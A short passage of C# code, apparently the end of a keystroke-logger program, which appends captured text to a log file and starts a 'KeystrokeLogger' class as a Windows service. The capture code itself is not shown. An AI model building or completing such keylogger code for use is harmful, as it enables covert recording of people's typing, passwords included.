            sb.Append("\r\n");
            log.Append(sb.ToString());
            File.AppendAllText(logFileName, sb.ToString());
        }
    }
}

class Program
{
    [STAThread]
    public static void Main(string[] args)
    {
        var service = new KeystrokeLogger();
        ServiceBase.Run(service);
    }
}
```

